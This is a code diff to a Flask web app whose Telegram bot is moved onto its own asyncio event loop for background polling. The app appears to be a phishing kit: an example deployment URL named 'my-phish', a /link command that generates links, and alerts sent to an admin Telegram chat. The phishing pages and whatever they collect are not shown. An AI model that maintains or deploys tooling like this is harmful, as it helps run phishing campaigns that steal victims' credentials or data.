@@ -7,6 +7,7 @@ import os
 import threading
 import logging
 import re
+import asyncio
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -15,6 +16,7 @@ logger = logging.getLogger(__name__)
 # --- CONFIGURATION ---
 BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "YOUR_TELEGRAM_USER_ID")
+# Render injects RENDER_URL (e.g., https://my-phish.onrender.com)
 RENDER_BASE_URL = os.getenv("RENDER_URL", "http://localhost:5000")
 
 app = Flask(__name__)
@@ -42,7 +44,7 @@ def send_telegram(text, chat_id=ADMIN_CHAT_ID):
 
 # --- TELEGRAM BOT HANDLERS ---
 def bot_listener():
-    """Runs the Telegram bot in a background thread."""
+    """Runs the Telegram bot in a background thread with its own event loop."""
     try:
         from telegram import Update
         from telegram.ext import Application, CommandHandler
@@ -54,7 +56,11 @@ def bot_listener():
         logger.warning("BOT_TOKEN is default. Bot listener not starting.")
         return
 
-    try:
+    # Create a new event loop for this thread
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+
+    async def run_bot():
         application = Application.builder().token(BOT_TOKEN).build()
 
         def start(update, context):
@@ -87,11 +93,21 @@ def bot_listener():
         application.add_handler(CommandHandler("link", generate_link))
         application.add_handler(CommandHandler("help", help_command))
 
-        logger.info("🤖 Bot listener started (Polling Mode).")
-        application.run_polling(allowed_updates=Update.ALL_TYPES)
+        logger.info("🤖 Bot listener started (Async Mode).")
+        await application.initialize()
+        await application.start()
+        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
+        
+        # Keep the bot running indefinitely
+        while True:
+            await asyncio.sleep(1)
 
+    try:
+        loop.run_until_complete(run_bot())
     except Exception as e:
         logger.critical(f"Bot listener crashed: {e}", exc_info=True)
+    finally:
+        loop.close()
 
 # Start Bot Listener in a background thread
 bot_thread = threading.Thread(target=bot_listener, daemon=True)
